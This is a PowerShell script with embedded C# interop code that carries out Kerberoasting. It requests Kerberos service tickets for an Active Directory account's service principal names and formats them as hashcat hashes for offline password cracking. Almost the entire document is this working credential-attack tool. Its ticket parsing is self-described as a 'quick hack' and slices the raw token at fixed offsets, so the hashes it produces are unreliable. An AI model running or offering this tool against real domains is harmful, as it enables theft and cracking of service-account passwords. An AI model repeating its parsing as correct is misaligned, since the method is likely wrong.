Add-Type @"
using System;
using System.Runtime.InteropServices;

public class K {
    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int AcquireCredentialsHandle(
        string pszPrincipal,
        string pszPackage,
        uint fCredentialUse,
        IntPtr pvLogonID,
        IntPtr pAuthData,
        IntPtr pGetKeyFn,
        IntPtr pvGetKeyArgument,
        out IntPtr phCredential,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int InitializeSecurityContext(
        ref IntPtr phCredential,
        IntPtr phContext,
        string pszTargetName,
        uint fContextReq,
        uint Reserved1,
        uint TargetDataRep,
        IntPtr pInput,
        uint Reserved2,
        out IntPtr phNewContext,
        ref SecBufferDesc pOutput,
        out uint pfContextAttr,
        out IntPtr ptsExpiry);

    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int FreeCredentialsHandle(IntPtr phCredential);

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBuffer {
        public uint cbBuffer;
        public uint BufferType;
        public IntPtr pvBuffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SecBufferDesc {
        public uint ulVersion;
        public uint cBuffers;
        public IntPtr pBuffers;
    }

    public static byte[] GetTicket(string spn) {
        IntPtr cred = IntPtr.Zero;
        IntPtr ctx = IntPtr.Zero;
        IntPtr expiry1 = IntPtr.Zero;
        IntPtr expiry2 = IntPtr.Zero;
        uint attr = 0;

        try {
            SecBuffer secBuf = new SecBuffer();
            secBuf.BufferType = 2; // SECBUFFER_TOKEN
            secBuf.cbBuffer = 12288;
            secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);

            IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
            Marshal.StructureToPtr(secBuf, pSecBuf, false);

            SecBufferDesc desc = new SecBufferDesc();
            desc.ulVersion = 0;
            desc.cBuffers = 1;
            desc.pBuffers = pSecBuf;

            if (AcquireCredentialsHandle(
                    null,
                    "Kerberos",
                    0x00000002,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    out cred,
                    out expiry1) != 0)
                return null;

            if (InitializeSecurityContext(
                    ref cred,
                    IntPtr.Zero,
                    spn,
                    0x00001000,
                    0,
                    16,
                    IntPtr.Zero,
                    0,
                    out ctx,
                    ref desc,
                    out attr,
                    out expiry2) != 0)
                return null;

            SecBuffer resultBuf = (SecBuffer)Marshal.PtrToStructure(pSecBuf, typeof(SecBuffer));
            if (resultBuf.cbBuffer == 0 || resultBuf.pvBuffer == IntPtr.Zero)
                return null;

            byte[] data = new byte[resultBuf.cbBuffer];
            Marshal.Copy(resultBuf.pvBuffer, data, 0, data.Length);
            return data;
        } finally {
            if (cred != IntPtr.Zero) FreeCredentialsHandle(cred);
        }
    }
}
"@

function Get-KerberosTicketHashcatFormat {
    param(
        [Parameter(Mandatory)]
        [string]$SamAccountName
    )

    $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
    if (-not $user) {
        Write-Error "User '${SamAccountName}' not found."
        return
    }

    foreach ($spn in $user.servicePrincipalName) {
        Write-Host "`n[+] Requesting TGS for SPN: ${spn}"

        try {
            $ticketBytes = [K]::GetTicket($spn)
            if (-not $ticketBytes) {
                Write-Warning "Failed to get ticket."
                continue
            }

            $ticketHex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
            $etype = ""

            # Quick hack to detect encryption type from raw hex
            if ($ticketHex -match "020117") {
                $etype = "23"
            } elseif ($ticketHex -match "020111") {
                $etype = "17"
            } elseif ($ticketHex -match "020112") {
                $etype = "18"
            } else {
                Write-Warning "[!] Could not determine encryption type for ${spn}"
                continue
            }

            # Extract checksum and cipher manually (rough fallback method)
            $checksumHex = $ticketHex.Substring(0, 32)
            $cipherHex = $ticketHex.Substring(32)

            # Format hashcat line
            $userPart = $SamAccountName
            $realm = "$env:USERDNSDOMAIN"
            $spnSanitized = $spn.Replace(":", "~")

            $hashcat = "\$krb5tgs\$${etype}*${userPart}\$${realm}\$${spnSanitized}*${checksumHex}\$${cipherHex}"
            Write-Host "[+] Hashcat Format:`n${hashcat}`n"
        }
        catch {
            Write-Warning "Error while processing SPN ${spn}: $_"
        }
    }
}
